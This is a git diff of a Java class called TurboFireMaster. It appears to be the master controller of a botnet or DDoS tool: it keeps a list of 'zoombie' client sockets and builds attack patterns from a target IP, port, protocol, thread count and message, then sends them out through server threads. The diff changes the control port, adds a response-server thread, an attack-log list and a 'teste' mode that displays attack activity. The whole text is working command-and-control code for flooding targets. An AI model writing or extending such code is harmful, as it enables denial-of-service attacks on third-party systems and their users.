@@ -16,13 +16,15 @@
  */
 package app;
 
-import java.net.ServerSocket;
-import java.net.Socket;
-import java.net.InetAddress;
+import java.util.concurrent.TimeUnit;
 import view.GUI;
 import utilies.AttackPattern;
 import tasks.ServerThread;
 import tasks.ClientThread;
+import tasks.ResponseServer;
+import java.net.ServerSocket;
+import java.net.Socket;
+import java.net.InetAddress;
 import java.util.List;
 import java.util.ArrayList;
 
@@ -79,6 +81,7 @@ public class TurboFireMaster {
      */
     private AttackPattern attackPattern;
 
+    private static List attackLogs;
     /** 
      * The master turbo fire executable version
      * object constructor. It sets a gui instance,
@@ -88,8 +91,9 @@ public class TurboFireMaster {
     */
     public TurboFireMaster() {
         this.gui = new GUI();
-        this.serverPort = 2525;
+        this.serverPort = 3425;
         this.zoombieList = new ArrayList<Socket>();
+        attackLogs = new ArrayList<AttackPattern>();
         startMaster();
     }
 
@@ -103,8 +107,16 @@ public class TurboFireMaster {
             this.gui.welcome("master", this.serverPort);
             String[] command = this.gui.getCommand();
             this.gui.clean();
-            
-            if(command[0].equals("listen")) {
+        if(command[0].equalsIgnoreCase("teste")) {
+                while(true) {
+                    try {
+                        TimeUnit.SECONDS.sleep(1);
+                        GUI.showAttackActivity(attackLogs.size(), attackLogs);
+                    } catch (InterruptedException ie) {
+                        GUI.showExceptionLog(ie.toString());
+                    }
+                }
+            }else if(command[0].equals("listen")) {
                 // Thread t = new Thread(new ServerThread());
                 // t.start();
                 // this.gui.pressEnterToContinue();
@@ -179,9 +191,11 @@ public class TurboFireMaster {
                 this.gui.showMessage("Attack Range: " + attackRange);
                 this.gui.showMessage("Message: " + message);
                 this.gui.pressEnterToContinue();
-                this.attackPattern = new AttackPattern(protocol, ipAddress, port, threadAmount, connectionTimeOut, attackRange, message);
-                Thread t = new Thread(new ServerThread(this.attackPattern));
+                this.attackPattern = new AttackPattern(protocol, ipAddress, port, threadAmount, connectionTimeOut, attackRange, message, null);
+                Thread t = new Thread(new ServerThread(this.serverPort ,this.attackPattern));
                 t.start();
+                Thread responseServer = new Thread(new ResponseServer());
+                responseServer.start();
             }
         }
     }
@@ -200,5 +214,9 @@ public class TurboFireMaster {
      */
     public InetAddress getServerAddress() {
         return this.server.getInetAddress();
+    }
+
+    public static void addAttackLog(AttackPattern data) {
+        attackLogs.add(data);
     }
 }
